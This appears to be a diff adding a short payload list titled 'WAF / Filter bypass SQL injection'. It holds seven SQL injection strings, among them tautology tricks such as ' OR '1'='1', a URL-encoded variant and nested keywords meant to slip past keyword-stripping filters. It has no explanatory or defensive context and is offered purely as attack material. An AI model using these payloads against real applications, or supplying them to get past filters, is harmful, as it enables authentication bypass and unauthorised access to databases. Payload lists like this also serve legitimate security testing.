@@ -1,0 +1,9 @@
+WAF / Filter bypass SQL injection :~
+
+' oR '1'='1'--
+' OR '1'='1'/* 
+%27%20OR%201=1--
+'UNIunionON SELselectECT 1,2,3--
+' OR '1'='1' --+
+' OR '1' LIKE '1
+' OR '1' IN ('1')
